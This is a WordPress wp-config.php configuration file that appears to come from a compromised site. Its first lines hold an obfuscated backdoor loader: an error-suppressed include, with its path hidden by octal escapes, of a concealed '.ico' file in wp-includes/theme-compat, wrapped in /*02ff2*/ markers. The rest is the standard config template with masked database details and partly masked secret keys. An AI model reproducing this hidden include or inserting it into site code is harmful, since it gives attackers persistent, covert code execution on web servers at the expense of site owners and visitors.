<?php
/*02ff2*/

@include "\057h\157m\145/\155a\147e\151n\163p\057p\165b\154i\143_\150t\155l\057w\160-\151n\143l\165d\145s\057t\150e\155e\055c\157m\160a\164/\056b\071a\067a\141d\143.\151c\157";

/*02ff2*/
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'XXXXXXXXXXXXXXXX');

/** MySQL database username */
define('DB_USER', 'XXXXXXXXXXXXXXXX');

/** MySQL database password */
define('DB_PASSWORD', 'XXXXXXXX');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         ')s24%NW1{nnDF8DhGVGNFvaIY0tW-E04W[:O;xrrITheUTs@u[/6: n<GM7W284n');
define('SECURE_AUTH_KEY',  'ilBV|%hMj!?<&l~7n`ojF~Xt~&*!qW|u>q(T|O*YLw5srn5]1- F`pG^c0Z4kI~&');
define('LOGGED_IN_KEY',    'U/5k4P$%7* I H/dE)?1*f.v)q(Ea(j-=KK<;d`L=Z4>gXXXXXXXX');
define('NONCE_KEY',        'w-==*cFh5Q&1?5{`Sooq{3q=Ro=)CfBA;&uum@dNqb%!!XXXXXXXX');
define('AUTH_SALT',        'LAs~#G Bp]{(g4mFTL`Rt*>H:=0_}u@K5A/}`XXXXXXXXZR^^W|');
define('SECURE_AUTH_SALT', 'kTp*/l}F$*.bh8g E>`]y.V9B59dnCmgAy2]qgXXXXXXXX`Hz}WBu|@{.gEg|sj}');
define('LOGGED_IN_SALT',   'H@`PL!+NUL-4ex;gXXXXXXXXOLJR~Q7=.xX.8%&7,MeA%Vf,F+g:=$})q#po');
define('NONCE_SALT',       '2C%!St/uc%h&UCjmK]dS_bF=au`Q*zp@ImXXXXXXXXE1 Gxq9@jc~.[ow3>)h|aa|');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
